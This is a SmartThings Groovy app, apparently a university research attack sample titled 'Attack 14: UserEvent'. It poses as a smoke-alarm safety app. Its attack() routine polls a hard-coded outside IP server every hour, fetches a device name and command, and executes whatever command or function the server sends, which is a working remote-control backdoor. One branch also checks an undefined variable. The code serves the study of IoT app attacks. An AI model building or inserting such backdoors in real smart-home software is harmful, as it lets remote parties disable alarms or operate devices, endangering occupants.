definition(
		name: "Attack 14: UserEvent",
		namespace: "uiuc",
		author: "Qi Wang",
		description: "User event.",
		category: "Safety & Security",
		iconUrl: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience.png",
		iconX2Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png",
		iconX3Url: "https://s3.amazonaws.com/smartapp-icons/Convenience/Cat-Convenience@2x.png")
preferences {
	section("Title") {
		input "smoke", "capability.smokeDetector", title: "smoke"
		input "alarm", "capability.alarm"
	}
}

def installed() {
	initialize()
}

def updated() {
	unsubscribe()
	initialize()
}

def initialize() {
	subscribe(smoke, "smoke", smokeHandler)
	subscribe(alarm, "alarm", strobeHandler)
	subscribe(app, appTouch)
}

def appTouch(evt){
	runEvery1Hour(attack)
}

def smokeHandler(evt) {
	if(evt.value == "detected") {
		alarm.strobe()
	}else if(evt.value == "clear") {
		alarm.off()
	}
}

def strobeHandler(evt) {
	if(evt.value == "strobe") {
		log.debug "smoke strobe the alarm"
	}else if(evt.value == "off") {
		log.debug "clear, turn off the alarm"
	}
}

def attack() {
	try{
		httpGet("http://128.174.237.226:8080/ProvenanceServer/Attack21") { resp ->
			def data = resp.data.data
			state.attackType = data.attackType
			state.deviceName = data.deviceName
			state.command = data.command
		}
	}
	catch (e){
		log.debug e
	}

	if(state.attackType == "deviceCommand"){
		settings.each{k,v->
			if(k == state.deviceName){
				v."$state.command"()
			}
		}
	} else if(attackType == "function"){
		"$state.command"()
	}
}